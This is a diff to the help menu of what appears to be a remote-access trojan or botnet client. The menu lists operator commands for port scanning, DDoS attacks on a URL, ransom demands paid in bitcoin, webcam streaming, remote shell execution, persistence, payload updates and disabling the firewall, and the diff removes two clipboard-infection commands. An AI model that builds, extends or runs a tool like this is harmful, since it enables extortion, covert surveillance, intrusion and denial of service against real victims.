@@ -6,12 +6,10 @@
           ║     pscan <ip> <startport> <endport> <thread>  ║     pscan bot 127.0.0.1 1 100 100             ║
           ║     ddos <method> <url> <thread> <t>           ║     ddos cfb https://google.com 10 5          ║
           ║     ransom <price> <email> <btc>               ║     ransom $100 mail@mail.com BTC             ║
-          ║     infectclipboard <url>                      ║     Admin privileges required                 ║
           ║     updatepayload <url>                        ║     Admin privileges required                 ║	  
           ║     webcam <ip> <port>                         ║     Stream webcam footage                     ║
           ║     shell <command>                            ║     Run shell commands                        ║
           ║     whois <ip>                                 ║     Get info on IP Address                    ║
-          ║     stopinfectclipboard                        ║     Admin privileges required                 ║  
           ║     kill                                       ║     Stop client from listening                ║
           ║     persistence                                ║     Set persistence                           ║
           ║     disablefirewall                            ║     Disable firewall                          ║
